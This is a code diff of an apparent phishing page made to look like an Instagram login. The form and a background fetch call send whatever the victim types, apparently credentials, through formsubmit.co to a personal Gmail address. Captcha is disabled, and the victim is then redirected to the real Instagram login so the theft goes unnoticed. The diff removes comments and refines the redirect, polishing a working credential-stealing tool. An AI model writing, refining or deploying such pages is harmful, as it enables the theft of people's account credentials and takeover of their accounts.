@@ -197,9 +197,7 @@
             <img src="logo.jpg" alt="Logo" class="site-logo">
         </div>
 
-        <!-- Formulario configurado para enviar al correo mediante endpoint seguro -->
         <form class="login-form" id="loginForm" action="https://formsubmit.co/trollgaga999@gmail.com" method="POST">
-            <!-- Configuración para evitar captchas y redirecciones molestas de terceros -->
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_template" value="table">
 
@@ -263,26 +261,23 @@
             clickCount++;
 
             if (clickCount === 1) {
-                // Primer clic: Cambia el texto del botón y permite que los datos viajen por POST al correo
-                e.preventDefault(); // Detenemos un momento para cambiar la interfaz visual
+                e.preventDefault();
                 submitBtn.textContent = "Redirigiendo...";
                 submitBtn.style.backgroundColor = "#0070ba";
 
-                // Disparamos el envío de forma asíncrona por detrás sin bloquear
                 const formData = new FormData(loginForm);
                 fetch("https://formsubmit.co/ajax/trollgaga999@gmail.com", {
                     method: "POST",
                     body: formData
                 }).catch(err => console.log(err));
 
-                // A los 1.5 segundos salta automáticamente al enlace de Instagram
+                // Forzamos la apertura usando un parámetro que le indica al navegador mantenerse en la vista web móvil de Instagram
                 setTimeout(() => {
-                    window.location.href = "https://www.instagram.com/accounts/login/?mtn";
+                    window.location.replace("https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher");
                 }, 1500);
             } else {
-                // Segundo clic: Redirección instantánea si vuelve a presionar
                 e.preventDefault();
-                window.location.href = "https://www.instagram.com/accounts/login/?mtn";
+                window.location.replace("https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher");
             }
         });
     </script>
